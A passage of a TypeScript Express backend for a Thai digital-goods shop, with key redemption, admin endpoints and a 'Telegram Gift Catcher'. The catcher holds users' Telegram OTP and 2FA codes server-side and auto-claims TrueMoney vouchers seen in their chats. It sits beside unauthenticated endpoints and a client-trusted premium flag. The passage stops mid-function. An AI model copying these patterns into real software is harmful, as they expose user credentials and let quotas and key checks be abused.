        username: userData.username || (req.user && req.user.email ? req.user.email.split('@')[0] : 'Unknown'),
        productId: productId,
        productName: `${productData.name || 'Unknown Product'} (x${quantity})`,
        price: totalCost,
        secretData: claimedItems.join('\n'),
        date: new Date().toISOString(),
        billNumber: 'B-' + Math.floor(Math.random()*1000000).toString().padStart(6, '0'),
        is_special: false
      };

      // Sanitize payload to strip any undefined values that Firestore will reject
      const userUpdatePayload = JSON.parse(JSON.stringify({ balance: newBalance }));
      const productUpdatePayload = JSON.parse(JSON.stringify({ 
        ...productData,
        stock: currentStockData.length, 
        stockData: currentStockData.filter(v => v !== undefined && v !== null), 
        soldCount: (Number(productData.soldCount) || 0) + quantity 
      }));
      const historyPayload = JSON.parse(JSON.stringify({
        id: newHistoryItem.id || 'N/A',
        userId: newHistoryItem.userId || 'N/A',
        username: newHistoryItem.username || 'Unknown',
        productId: newHistoryItem.productId || 'N/A',
        productName: newHistoryItem.productName || 'Unknown Product',
        price: newHistoryItem.price || 0,
        secretData: newHistoryItem.secretData || '',
        date: newHistoryItem.date || new Date().toISOString(),
        billNumber: newHistoryItem.billNumber || 'B-000000',
        is_special: false
      }));

      // Fire off response IMMEDIATELY so user gets 0.1s response times
      res.json({
        success: true,
        purchase: newHistoryItem,
        updatedUser: { ...userData, balance: newBalance },
        updatedProduct: { id: productId, ...productData, stock: currentStockData.length, soldCount: (productData.soldCount || 0) + quantity },
      });

      // Perform updates in background and then release lock
      Promise.all([
        userRef.update(userUpdatePayload),
        productRef.update(productUpdatePayload),
        admin.firestore().collection('purchases').add(historyPayload)
      ]).then(() => {
        invalidateCache('products');
        invalidateCache('purchases');
        invalidateStatsCache();
        releaseLock!();
        delete purchaseLocks[lockKey];
      }).catch((bgErr) => {
        const fs = require('fs');
        try { fs.writeFileSync('purchase_bg_error.log', JSON.stringify({ message: bgErr.message, stack: bgErr.stack })); } catch(e){}
        console.error('------- BACKGROUND BUY ERROR -------', bgErr);
        releaseLock!();
        delete purchaseLocks[lockKey];
      });

    } catch (err: any) {
      const fs = require('fs');
      try { fs.writeFileSync('purchase_error.log', JSON.stringify({ message: err.message, stack: err.stack, details: err.details, code: err.code })); } catch(e){}
      console.error('------- BUY ERROR TRACE -------');
      console.error(err);
      if (err.details) console.error('Details:', err.details);
      console.error('------- END BUY ERROR -------');
      
      releaseLock!();
      delete purchaseLocks[lockKey];
      
      // If we haven't sent headers yet, send an error
      if (!res.headersSent) {
        res.status(500).json({ error: 'Internal server error during purchase', details: String(err && err.message ? err.message : err), code: err.code });
      }
    }
  });

  // --- Topups Endpoints ---
  app.get('/api/topups', async (req: any, res: any) => {
    try {
      const adminDb = admin.firestore();
      let q: any = adminDb.collection('topups');
      if (req.isAdmin) {
        q = q.orderBy('date', 'desc').limit(100);
      } else if (req.user) {
        q = q.where('userId', '==', req.user.uid).orderBy('date', 'desc').limit(100);
      } else {
        return res.json([]);
      }
      const snapshot = await q.get();
      const data = snapshot.docs.map(doc => ({ dbId: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching topups:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/topups', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const docRef = await admin.firestore().collection('topups').add(data);
      res.json({ id: docRef.id, dbId: docRef.id, ...data });
    } catch (err) {
      console.error('Internal server error creating topup:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- Categories Endpoints ---
  app.get('/api/categories', async (req, res) => {
    try {
      const data = await getCachedCollection('categories', 60000);
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching categories:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/categories', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const { id, ...dataToSave } = data;
      const docRef = await admin.firestore().collection('categories').add(dataToSave);
      invalidateCache('categories');
      res.json({ id: docRef.id, dbId: docRef.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error creating category:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.put('/api/categories/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const { id, ...dataToSave } = data;
      const docRef = admin.firestore().collection('categories').doc(req.params.id);
      await docRef.update(dataToSave);
      invalidateCache('categories');
      res.json({ id: req.params.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error updating category:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/categories/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      await admin.firestore().collection('categories').doc(req.params.id).delete();
      invalidateCache('categories');
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting category:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- Custom Pages Endpoints ---
  app.get('/api/pages', async (req, res) => {
    try {
      const data = await getCachedCollection('custom_pages', 60000);
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching pages:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/pages', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const pageData = req.body;
      const { id, ...dataToSave } = pageData;
      const docRef = await admin.firestore().collection('custom_pages').add({ ...dataToSave, created_at: new Date().toISOString() });
      invalidateCache('custom_pages');
      res.json({ id: docRef.id, dbId: docRef.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error creating page:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.put('/api/pages/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const pageData = req.body;
      const { id, ...dataToSave } = pageData;
      const docRef = admin.firestore().collection('custom_pages').doc(req.params.id);
      await docRef.update(dataToSave);
      invalidateCache('custom_pages');
      res.json({ id: req.params.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error updating page:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/pages/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      await admin.firestore().collection('custom_pages').doc(req.params.id).delete();
      invalidateCache('custom_pages');
      res.json({ success: true });
    } catch (err: any) {
      console.error('Internal server error deleting page:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- Log Categories System Endpoints (Stored as JSON in settings for dynamic schema) ---
  let memoryLogSystemData = { categories: [], items: [] };

  app.get('/api/logs-system', async (req, res) => {
    try {
      let dbData;
      try {
        const doc = await admin.firestore().collection('settings').doc('log_system_data').get();
        if (doc.exists) {
           const d = doc.data();
           dbData = d?.data; 
        }
      } catch (e) {}

      let payload = dbData || memoryLogSystemData;
      if (!payload || !payload.categories) payload = { categories: [], items: [] };
      
      // Auto-filter based on user VIP status
      let isVip = false;
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.substring(7);
        try {
          const { data: { user }, error } = await supabaseAdmin.auth.getUser(token);
          if (user) {
            const userDoc = await admin.firestore().collection('users').doc(user.id).get();
            if (userDoc.exists) {
               const u = userDoc.data();
               if (u.isPremium === true) isVip = true;
               if (u.role === 'admin' || u.role === 'Admin') isVip = true;
            }
          }
        } catch(e) {}
      }

      // Hide content if user is not VIP and item type is premium or belongs to a premium category maybe?
      if (!isVip) {
         if (Array.isArray(payload.items)) {
             payload.items = payload.items.map((item: any) => {
                 if (item.type === 'premium') {
                    return { ...item, attachments: [] }; // strip files
                 }
                 return item;
             });
         }
      }

      res.json({ ...payload, isVip });
    } catch (err: any) {
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/logs-system', requireAdmin, async (req, res) => {
    try {
      const data = req.body;
      memoryLogSystemData = data;
      try {
        if (admin.firestore()) {
          await admin.firestore().collection('settings').doc('log_system_data').set({ data }, { merge: false });
        }
      } catch (e: any) {
        console.warn('Failed to save log system data to DB, keeping in memory:', e.message);
      }
      res.json({ success: true });
    } catch (err: any) {
      console.error('Internal server error saving log system data:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/license_keys', requireAdmin, async (req: any, res: any) => {
    try {
      const snapshot = await admin.firestore().collection('license_keys').orderBy('created_at', 'desc').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching license_keys:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/license_keys', requireAdmin, async (req, res) => {
    try {
      const { key, plan, status } = req.body;
      const newDoc = { key, plan, status, created_at: new Date().toISOString() };
      const docRef = await admin.firestore().collection('license_keys').add(newDoc);
      res.json({ id: docRef.id, dbId: docRef.id, ...newDoc });
    } catch (err) {
      console.error('Internal server error inserting license_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/license_keys/:id', requireAdmin, async (req, res) => {
    try {
      await admin.firestore().collection('license_keys').doc(req.params.id).delete();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting license_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/license_keys/bulk_delete', requireAdmin, async (req, res) => {
    try {
      const { ids } = req.body;
      if (!Array.isArray(ids)) return res.status(400).json({ error: 'ids must be an array' });
      await Promise.all(ids.map(id => admin.firestore().collection('license_keys').doc(id).delete()));
      res.json({ success: true, deletedCount: ids.length });
    } catch (err) {
      console.error('Internal server error bulk deleting license_keys:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.patch('/api/license_keys/:id', requireAdmin, async (req, res) => {
    try {
      const { status } = req.body;
      const docRef = admin.firestore().collection('license_keys').doc(req.params.id);
      await docRef.update({ status });
      res.json({ id: req.params.id, status });
    } catch (err) {
      console.error('Internal server error updating license_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/license_keys/bulk', requireAdmin, async (req, res) => {
    try {
      const { keys } = req.body; // Array of { key, type, status, created_at }
      const results = [];
      for (const k of keys) {
         const docRef = await admin.firestore().collection('license_keys').add({ ...k, created_at: new Date().toISOString() });
         results.push({ id: docRef.id, ...k });
      }
      res.json(results);
    } catch (err) {
      console.error('Internal server error bulk inserting license_keys:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/validate_key/:key', async (req, res) => {
    try {
      const snapshot = await admin.firestore().collection('license_keys').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })).find((d: any) => d.key === req.params.key);
      if (!data) return res.status(404).json({ error: 'Key not found' });
      res.json(data);
    } catch (err) {
      console.error('Internal server error validating key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/used_keys', requireAdmin, async (req: any, res: any) => {
    try {
      const snapshot = await admin.firestore().collection('used_keys').orderBy('used_at', 'desc').limit(100).get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching used_keys:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/used_keys', async (req, res) => {
    try {
      const { key, ip, details } = req.body;
      const newDoc = { key, ip, details, used_at: new Date().toISOString() };
      const docRef = await admin.firestore().collection('used_keys').add(newDoc);
      res.json({ id: docRef.id, dbId: docRef.id, ...newDoc });
    } catch (err) {
      console.error('Internal server error inserting used_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/blocked_ips', requireAdmin, async (req: any, res: any) => {
    try {
      const snapshot = await admin.firestore().collection('blocked_ips').orderBy('blocked_at', 'desc').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching blocked_ips:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/blocked_ips', requireAdmin, async (req, res) => {
    try {
      const { ip, reason } = req.body;
      const newDoc = { ip, reason, blocked_at: new Date().toISOString() };
      // Note: simplistic upsert simulation using ip as doc ID
      const docRef = admin.firestore().collection('blocked_ips').doc(ip);
      await docRef.set(newDoc);
      res.json({ id: ip, ...newDoc });
    } catch (err) {
      console.error('Internal server error upserting blocked_ip:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/blocked_ips/:ip', requireAdmin, async (req, res) => {
    try {
      await admin.firestore().collection('blocked_ips').doc(req.params.ip).delete();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting blocked_ip:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/check_ip/:ip', async (req, res) => {
    try {
      const snapshot = await admin.firestore().collection('blocked_ips').get();
      const data = snapshot.docs.map(doc => doc.data()).find((d: any) => d.ip === req.params.ip);
      res.json({ blocked: !!data });
    } catch (err) {
      console.error('Internal server error checking IP:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- API Keys Endpoints ---
  app.get('/api/api_keys', requireAdmin, async (req: any, res: any) => {
    try {
      const snapshot = await admin.firestore().collection('api_keys').orderBy('created_at', 'desc').get();
      const keys = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(keys);
    } catch (err: any) {
      console.error('API Keys fetch error:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/api_keys', requireAdmin, async (req: any, res: any) => {
    try {
      const { name, is_lifetime, expire_days } = req.body;
      const keyString = 'apx_' + crypto.randomBytes(16).toString('hex');
      const now = new Date();
      let expires_at = null;
      if (!is_lifetime && expire_days) {
         now.setDate(now.getDate() + parseInt(expire_days));
         expires_at = now.toISOString();
      }
      const newKey = {
         key: keyString,
         name: name || 'Unnamed Key',
         status: 'active',
         created_at: new Date().toISOString(),
         expires_at,
         last_used: null
      };
      await admin.firestore().collection('api_keys').doc(keyString).set(newKey);
      res.json(newKey);
    } catch (err: any) {
       res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/api_keys/:key', requireAdmin, async (req: any, res: any) => {
    try {
      await admin.firestore().collection('api_keys').doc(req.params.key).delete();
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.patch('/api/api_keys/:key', requireAdmin, async (req: any, res: any) => {
    try {
      const { status } = req.body;
      await admin.firestore().collection('api_keys').doc(req.params.key).update({ status });
      res.json({ success: true, status });
    } catch (err: any) {
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/admins', requireAdmin, async (req: any, res: any) => {
    try {
      const { username, role } = req.body;
      const newDoc = { username, role, granted_at: new Date().toISOString() };
      const docRef = admin.firestore().collection('admins').doc(username);
      await docRef.set(newDoc);
      res.json({ id: username, ...newDoc });
    } catch (err) {
      console.error('Internal server error upserting admin:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- Community Endpoints ---
  const communityFile = path.resolve(os.tmpdir(), 'community_data.json');
  let communityData: { categories: any[], channels: any[], messages: any[], userRanks: Record<string, string> } = { categories: [], channels: [], messages: [], userRanks: {} };
  if (fs.existsSync(communityFile)) {
    try {
      communityData = JSON.parse(fs.readFileSync(communityFile, 'utf-8'));
      if (!communityData.userRanks) communityData.userRanks = {};
    } catch(e) {}
  }
  const saveCommunity = () => {
    try {
      fs.writeFileSync(communityFile, JSON.stringify(communityData));
    } catch(e) {
      console.warn("Could not write communityData JSON to file system. Proceeding in-memory only.");
    }
  };

  // Initialize defaults
  if (communityData.categories.length === 0) {
     const catId = 'cat-' + Date.now();
     communityData.categories.push({ id: catId, name: 'INFORMATION', order: 0 });
     communityData.channels.push({ id: 'ch-claim', categoryId: catId, name: 'รับยศ-basic', type: 'role_claim', order: 0 });
     communityData.channels.push({ id: 'ch-gen', categoryId: catId, name: 'ประกาศทั่วไป', type: 'text', order: 1 });
     saveCommunity();
  }

  // Community endpoints removed

  // Mutex for key redemption
  const redeemLocks: Record<string, Promise<any>> = {};

  app.post('/api/redeem', requireAuth, async (req: any, res: any) => {
    const { key } = req.body;
    if (!key) return res.status(400).json({ error: 'Key is required' });

    // Acquire lock for this key
    while (redeemLocks[key]) {
      await redeemLocks[key];
    }
    
    let releaseLock: () => void;
    redeemLocks[key] = new Promise(resolve => { releaseLock = resolve as any; });

    try {
      const uid = req.user.uid;
      
      let keyData: any = null;
      let keyDocRef: any = null;
      let isProductKey = false;

      // 1. ลองหาคีย์ใน license_keys (ระบบคีย์ระดับ Premium/VIP แบบเก่า)
      const snapshot = await admin.firestore().collection('license_keys').where('key', '==', key).where('status', '==', 'active').get();
      if (!snapshot.docs || snapshot.docs.length === 0) {
        
        // 2. ถ้าไม่เจอ ลองหาในประวัติการสั่งซื้อ (เผื่อเป็นคีย์แรนด้อม/คีย์สินค้าที่ซื้อไป)
        const purchasesRef = admin.firestore().collection('purchases');
        const purchasesSnapshot = await purchasesRef.get();
        let foundDoc = null;
        for (const doc of purchasesSnapshot.docs) {
          const data = doc.data();
          if (data.secretData && !data.webClaimed) {
             const keysInPurchase = data.secretData.split('\n').map((k: string) => k.trim());
             if (keysInPurchase.includes(key.trim())) {
               foundDoc = { id: doc.id, ...data };
               keyDocRef = purchasesRef.doc(doc.id);
               break;
             }
          }
        }

        if (!foundDoc) {
           return res.status(400).json({ error: 'ไม่พบคีย์ในระบบ หรือคีย์นี้ถูกใช้งานไปแล้ว' });
        }

        isProductKey = true;
        keyData = foundDoc;

      } else {
        keyData = snapshot.docs[0].data();
        keyDocRef = admin.firestore().collection('license_keys').doc(snapshot.docs[0].id);
      }
      
      let rankToGive = 'premium';
      let expireDate = new Date();

      if (isProductKey) {
        // อัปเดตคีย์สั่งซื้อว่าถูกใช้รับยศในเว็บแล้ว
        await keyDocRef.update({ ...keyData, webClaimed: true });
        
        // ให้ยศเป็นชื่อของสินค้า (หรือถ้าอยากให้เป็น premium ก็ใส่ premium)
        rankToGive = keyData.productName?.replace(/ \(.+\)/g, '') || 'VIP';
        
        // เพิ่มลงในประวัติ (optional)
        await admin.firestore().collection('used_keys').add({
          key: key,
          ip: req.ip,
          details: `Redeemed product rank ${rankToGive}`,
          used_at: new Date().toISOString()
        });

        // คีย์สินค้ารับยศได้ ให้เป็นตลอดชีพ
        expireDate.setDate(expireDate.getDate() + 9999);

      } else {
        // ระบบคีย์จาก license_keys เดิม
        await keyDocRef.update({ status: 'used' });
        await admin.firestore().collection('used_keys').add({
          key: key,
          ip: req.ip,
          details: `Redeemed rank ${keyData.type}`,
          used_at: new Date().toISOString()
        });
        
        let days = 1;
        if (keyData.type === 'Week') days = 7;
        if (keyData.type === 'Month') days = 30;
        if (keyData.type === '3Month') days = 90;
        if (keyData.type === 'Year') days = 365;
        if (keyData.type === 'Lifetime') days = 9999;
        expireDate.setDate(expireDate.getDate() + days);
      }
      
      communityData.userRanks = communityData.userRanks || {};
      communityData.userRanks[uid] = rankToGive;
      saveCommunity();

      await admin.firestore().collection('users').doc(uid).set({
        isPremium: true,
        rank: rankToGive,
        premiumExpireDate: expireDate.toISOString()
      }, { merge: true });
      
      res.json({ success: true, rank: rankToGive, type: isProductKey ? 'Product Rank' : keyData.type });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    } finally {
      releaseLock!();
      delete redeemLocks[key];
    }
  });

  // --- User Profiles Endpoints ---
  app.get('/api/users/:uid', requireAuth, async (req: any, res: any) => {
    if (req.user.uid !== req.params.uid && !req.isAdmin) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const docRef = admin.firestore().collection('users').doc(req.params.uid);
      const snapshot = await docRef.get();
      if (snapshot.exists) {
        const data = snapshot.data();
        data.rank = communityData.userRanks?.[req.params.uid] || data.rank || 'user';
        res.json(data);
      } else {
        res.status(404).json({ error: 'User not found' });
      }
    } catch (err) {
      console.error('Error fetching user:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/users/:uid', requireAuth, async (req: any, res: any) => {
    if (req.user.uid !== req.params.uid && !req.isAdmin) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const { uid } = req.params;
      const data = req.body;
      
      // Prevent privilege escalation and balance spoofing
      if (!req.isAdmin) {
        delete data.balance;
        delete data.amount;
        delete data.role;
        delete data.isPremium;
        delete data.status;
      }
      
      const docRef = admin.firestore().collection('users').doc(uid);
      await docRef.set({ ...data, updatedAt: new Date().toISOString() }, { merge: true });
      res.json({ success: true });
    } catch (err: any) {
      console.error('Error saving user:', err.message || JSON.stringify(err));
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/users/:uid/password', requireAdmin, async (req: any, res: any) => {
    try {
      const { uid } = req.params;
      const { password } = req.body;
      if (!password) return res.status(400).json({ error: 'Missing password' });
      await supabaseAdmin.auth.admin.updateUserById(uid, { password });
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/users/:uid', requireAdmin, async (req: any, res: any) => {
    try {
      const { uid } = req.params;
      await supabaseAdmin.auth.admin.deleteUser(uid).catch(() => {});
      await admin.firestore().collection('users').doc(uid).delete();
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/users', requireAdmin, async (req: any, res: any) => {
    try {
      const { data: authUsers, error } = await supabaseAdmin.auth.admin.listUsers();
      if (!error && authUsers && authUsers.users) {
         for (const authUser of authUsers.users) {
            const docRef = admin.firestore().collection('users').doc(authUser.id);
            const snap = await docRef.get();
            if (!snap.exists) {
                await docRef.set({
                    email: authUser.email,
                    username: authUser.email ? authUser.email.split('@')[0] : 'unknown',
                    balance: 0,
                    role: 'user',
                    status: 'active',
                    createdAt: authUser.created_at || new Date().toISOString(),
                    updatedAt: authUser.created_at || new Date().toISOString()
                }, { merge: true });
            }
         }
      }

      const snapshot = await admin.firestore().collection('users').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Error fetching all users:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/log_error', (req, res) => {
    try {
      const safeBody = typeof req.body === 'object' ? JSON.stringify({ type: req.body.type, message: req.body.message, stack: req.body.stack, componentStack: req.body.componentStack }) : String(req.body).substring(0, 200);
      console.error('CLIENT ERROR:', safeBody);
    } catch(e) {}
    res.json({ received: true });
  });


  let globalBotProcess: ChildProcess | null = null;
  let globalBotLogs: string[] = [];

  app.get('/bot-code', (req, res) => {
    try {
        const cfgPath = path.join(process.cwd(), 'twer_temp', 'index.js');
        if (fs.existsSync(cfgPath)) {
            const content = fs.readFileSync(cfgPath, 'utf8');
            res.setHeader('Content-Type', 'text/plain; charset=utf-8');
            res.send(content);
        } else {
            res.status(404).send('Bot code not found');
        }
    } catch (err) {
        res.status(500).send('Error reading bot code');
    }
  });

  app.get('/api/bot/status', requireAdmin, (req, res) => {
    res.json({
      running: globalBotProcess !== null && !globalBotProcess.killed,
      logs: globalBotLogs.slice(-100)
    });
  });

  app.post('/api/bot/start', requireAdmin, (req, res) => {
    if (globalBotProcess !== null && !globalBotProcess.killed) {
      return res.status(400).json({ error: 'Bot is already running' });
    }
    
    // Save config first if provided
    if (req.body.config) {
        fs.writeFileSync(path.join(process.cwd(), 'twer_temp', 'bot_config.js'), req.body.config);
    }
    
    globalBotLogs = [];
    globalBotProcess = spawn('node', [path.join(process.cwd(), 'twer_temp', 'index.js')], {
       cwd: path.join(process.cwd(), 'twer_temp'),
       stdio: ['ignore', 'pipe', 'pipe']
    });

    globalBotProcess.stdout?.on('data', (data) => {
       const str = data.toString();
       globalBotLogs.push(str);
       if (globalBotLogs.length > 500) globalBotLogs.shift();
       console.log('[BOT]', str.trim());
    });
    
    globalBotProcess.stderr?.on('data', (data) => {
       const str = data.toString();
       globalBotLogs.push('[ERROR] ' + str);
       if (globalBotLogs.length > 500) globalBotLogs.shift();
       console.error('[BOT ERROR]', str.trim());
    });

    globalBotProcess.on('close', (code) => {
       globalBotLogs.push(`[SYSTEM] Bot Process exited with code ${code}`);
       globalBotProcess = null;
    });

    res.json({ success: true, message: 'Bot started' });
  });

  app.post('/api/bot/stop', requireAdmin, (req, res) => {
    if (globalBotProcess) {
       globalBotProcess.kill('SIGINT');
       globalBotProcess = null;
       res.json({ success: true, message: 'Bot stopped' });
    } else {
       res.status(400).json({ error: 'Bot is not running' });
    }
  });

  app.get('/api/bot/config', requireAdmin, (req, res) => {
    try {
        const cfgPath = path.join(process.cwd(), 'twer_temp', 'bot_config.js');
        if (fs.existsSync(cfgPath)) {
            const content = fs.readFileSync(cfgPath, 'utf8');
            res.json({ config: content });
        } else {
            res.json({ config: 'module.exports = {\n  token: "",\n  adminIds: ["123"],\n  maxUsers: 30,\n  delayPerUser: 10,\n  delayOwner: 20,\n  delayOwnerToThird: 100,\n  voucherCodeRegex: /[A-Za-z0-9]{20,}/g,\n  ownerPhone: "",\n  ownerWebhook: ""\n};' });
        }
    } catch (e) {
        res.status(500).json({ error: String(e) });
    }
  });


  // --- Telegram Gift Catcher Service ---
  const { TelegramClient } = await import('telegram');
  const { StringSession } = await import('telegram/sessions/index.js');
  const { NewMessage } = await import('telegram/events/index.js');
  const { default: twApi } = await import('@opecgame/twapi');

  let tgDailyCount = 0;
  let tgLastResetDate = new Date().toISOString().slice(0, 10);

  const tgSessions = new Map<string, {
      client: any,
      status: 'idle' | 'pending_otp' | 'pending_password' | 'connected' | 'error',
      truemoneyPhone: string,
      resolveOtp?: (code: string) => void,
      resolvePassword?: (pwd: string) => void,
      logs: string[]
  }>();

  function pushTgLog(phone: string, msg: string) {
      const sess = tgSessions.get(phone);
      if (sess) {
          sess.logs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
          if (sess.logs.length > 50) sess.logs.shift();
      }
  }

  function createResolver() {
      let rs: any;
      const p = new Promise(resolve => rs = resolve);
      return { promise: p, resolve: rs };
  }

  app.post('/api/telegram/catcher/request', async (req, res) => {
      const { telegramPhone, truemoneyPhone, isPremium } = req.body;
      if (!telegramPhone || !truemoneyPhone) return res.status(400).json({ error: 'Missing phone numbers' });

      // Daily Limit logic (100 users) -> Note: If premium, bypass.
      const today = new Date().toISOString().slice(0, 10);
      if (tgLastResetDate !== today) {
          tgLastResetDate = today;
          tgDailyCount = 0;
      }

      if (!isPremium) {
          if (tgDailyCount >= 100) {
              return res.status(400).json({ error: 'โควต้าผู้ใช้งานฟรีเต็มแล้วสำหรับวันนี้ (100 คน) กรุณากลับมาใหม่พรุ่งนี้ หรืออัปเกรด VIP' });
          }
          tgDailyCount++;
      }

      try {
          let sess = tgSessions.get(telegramPhone);
          if (sess && sess.status === 'connected') {
             // Already running?
             return res.json({ status: 'connected' });
          }

          const client = new TelegramClient(new StringSession(''), 2040, 'b18441a1ff607e10a989891a5462e627', { connectionRetries: 3 });
          
          sess = { 
              client, 
              status: 'idle', 
              truemoneyPhone,
              logs: ['เริ่มเชื่อมต่อเข้าสู่ระบบ Telegram...']
          };
          tgSessions.set(telegramPhone, sess);

          // Asynchronous start
          client.start({
              phoneNumber: telegramPhone,
              phoneCode: async () => {
                  const sessData = tgSessions.get(telegramPhone)!;
                  sessData.status = 'pending_otp';
                  sessData.logs.push('รอรหัส OTP จาก Telegram ของคุณ...');
                  const { promise, resolve } = createResolver();
                  sessData.resolveOtp = resolve;
                  return await promise as string;
              },
              password: async () => {
                   const sessData = tgSessions.get(telegramPhone)!;
                   sessData.status = 'pending_password';
                   sessData.logs.push('ต้องการรหัส 2FA Password...');
                   const { promise, resolve } = createResolver();
                   sessData.resolvePassword = resolve;
                   return await promise as string;
              },
              onError: (err: any) => {
                  const sessData = tgSessions.get(telegramPhone);
                  if (sessData) {
                      sessData.status = 'error';
                      sessData.logs.push(`ข้อผิดพลาด: ${err.message}`);
                  }
              }
          }).then(() => {
              const sessData = tgSessions.get(telegramPhone)!;
              sessData.status = 'connected';
              sessData.logs.push('เชื่อมต่อบัญชีสำเร็จ! บอทกำลังดักซองในพื้นหลัง (คุณสามารถปิดหน้านี้ได้)');
              
              // Handle New Message
              client.addEventHandler(async (event: any) => {
                  const message = event.message;
                  if (!message) return;
                  if (message.message) {
                      const voucherRegex = /https?:\/\/gift\.truemoney\.com\/campaign\/?(?:voucher_detail\/)?\?v=([A-Za-z0-9]+)/gi;
                      const matches = message.message.match(voucherRegex);
                      if (matches && matches.length > 0) {
                          pushTgLog(telegramPhone, `🎯 เจอซอง! เริ่มการรับเครดิตเข้าเบอร์ ${truemoneyPhone}`);
                          for (const vurl of matches) {
                              try {
                                  const result = await twApi(vurl, truemoneyPhone);
                                  if (result?.status?.code === 'SUCCESS') {
                                      pushTgLog(telegramPhone, `✅ รับซองสำเร็จ! +${result.data.my_ticket.amount_baht} บาท`);
                                  } else {
